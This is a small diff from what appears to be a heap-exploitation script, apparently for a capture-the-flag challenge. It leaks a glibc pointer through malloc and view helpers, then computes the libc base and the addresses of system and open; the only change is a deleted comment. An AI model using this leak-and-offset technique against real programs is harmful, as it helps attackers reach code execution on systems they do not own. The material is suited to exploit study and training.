@@ -67,7 +67,6 @@ malloc(20, 1535)
 mem = view(20)
 glibc_leak = int.from_bytes(mem[:8], byteorder="little")
 
-# Calculate important addresses
 libc_base = glibc_leak - 0x1ECBE0
 system_addr = libc_base + 0x52290
 open_addr = libc_base + 0x10DF00
